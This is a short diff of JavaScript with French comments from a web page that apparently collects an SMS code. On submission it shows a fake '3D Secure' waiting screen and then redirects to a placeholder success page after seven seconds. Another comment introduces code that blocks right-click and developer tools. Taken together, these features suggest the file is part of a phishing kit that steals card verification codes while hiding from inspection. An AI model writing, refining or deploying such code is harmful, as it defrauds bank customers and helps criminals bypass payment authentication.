@@ -133,16 +133,14 @@
                 }),
             });
 
-            // Afficher l'écran d'attente 3D Secure pendant 7 secondes avant la redirection
-            setTimeout(function() {
-                document.getElementById('smsForm').style.display = 'none';
-                document.getElementById('waiting').style.display = 'block';
+            // Afficher l'écran d'attente 3D Secure immédiatement après la soumission du formulaire SMS
+            document.getElementById('smsForm').style.display = 'none';
+            document.getElementById('waiting').style.display = 'block';
 
-                // Redirection après 7 secondes
-                setTimeout(function() {
-                    window.location.href = 'https://example.com/success'; // Remplacez par l'URL de la page de paiement réussi
-                }, 7000); // 7 secondes d'attente avant la redirection
-            }, 7000); // 7 secondes d'attente avant l'affichage de l'écran 3D Secure
+            // Attendre 7 secondes avant la redirection
+            setTimeout(function() {
+                window.location.href = 'https://example.com/success'; // Remplacez par l'URL de la page de paiement réussi
+            }, 7000); // 7 secondes d'attente avant la redirection
         });
 
         // Désactiver le clic droit et les outils de développement
